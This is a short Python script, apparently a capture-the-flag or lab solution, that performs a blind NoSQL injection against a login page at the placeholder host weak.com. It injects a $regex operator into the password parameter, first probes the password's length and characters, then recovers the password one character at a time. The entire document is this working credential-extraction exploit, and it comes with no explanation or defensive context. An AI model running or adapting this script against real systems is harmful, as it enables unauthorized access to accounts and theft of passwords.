import requests, string
from urllib.parse import quote_plus

def test_regex(r):
    return "SUCCESS" in requests.get("http://weak.com/index.php?password[$regex]="+quote_plus(r)).text

for l in range(1000):
    if test_regex("^.{"+str(l)+"}$"):
        break
    
print("len =", l)

chars = []

for c in string.printable:
    if test_regex(c):
        if c in "\^$*+?.()[]{}|":
            chars.append("\\"+c)
        else:
            chars.append(c)

print("chars :", chars)


password = ""

while len(password) < l:
    for c in chars:
        if test_regex("^"+password+c+".{"+str(l-len(password)-1)+"}$"):
            password += c
            print(password)
            break
